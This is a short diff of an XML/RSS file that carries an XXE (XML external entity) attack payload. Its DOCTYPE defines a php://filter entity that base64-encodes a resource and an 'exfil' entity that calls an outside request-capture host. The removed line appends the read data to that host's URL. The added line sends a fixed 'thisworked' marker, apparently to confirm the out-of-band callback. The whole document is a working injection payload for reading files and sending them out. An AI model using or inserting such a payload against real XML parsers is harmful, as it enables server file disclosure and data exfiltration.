@@ -2,7 +2,7 @@
 <!DOCTYPE roottag [ 
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://putsreq.com/jcVVqYcNb9zESnp2Fqws">
  %file;
- <!ENTITY exfil SYSTEM "http://putsreq.com/jcVVqYcNb9zESnp2Fqws?%file;">
+ <!ENTITY exfil SYSTEM "http://putsreq.com/jcVVqYcNb9zESnp2Fqws?so=thisworked">
 ]>
 <rss version="2.0">
 <channel>
